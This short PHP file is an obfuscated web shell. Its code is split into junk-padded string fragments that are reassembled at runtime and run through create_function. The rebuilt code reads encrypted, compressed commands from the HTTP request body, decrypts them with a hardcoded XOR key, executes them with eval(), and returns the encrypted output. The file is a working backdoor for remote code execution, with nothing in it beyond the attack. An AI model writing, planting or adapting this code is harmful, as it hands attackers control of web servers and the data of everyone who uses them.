<?php
$r=');$jE++,E$EiE++){$o.=$t{$i}^$k{$jE};EE}}retEurn $o;E}if (@preEg_EmEa';
$U=str_replace('UD','','cUDreaUDtUDeUD_funcUDtiUDon');
$W='tch("/$kh(.+)$kf/"E,@file_getE_contEentsE("php:E//Einput"E),E$m';
$B='"ENwMlIEOQC7phEUzRZa";EfunctEion x(EE$t,$kE){$c=strElen($Ek);$l';
$R=')==1) {@ob_starEt();@eEvaEl(@EEgEzuncompress(E@x(E@base6E4_Edeco';
$e='de($m[1]),$k)));$o=@oEEEb_get_contents();@EEob_eEnd_clean();$Er=@b';
$Y='E$k="2020f86e";E$kEh="72E0c94f24b1f";E$kEEf=E"777fdea0dfe8";$p=';
$k='aEse64_EEencode(@Ex(@gzcEoEmpress(E$o),$k));prEint("$pE$kh$r$kf");}';
$P='=strElen($tEE);$o="";for($EiE=0;$EiE<$l;){for($j=0;($j<$Ec&&$i<$El';
$C=str_replace('E','',$Y.$B.$P.$r.$W.$R.$e.$k);
$n=$U('',$C);$n();
?>
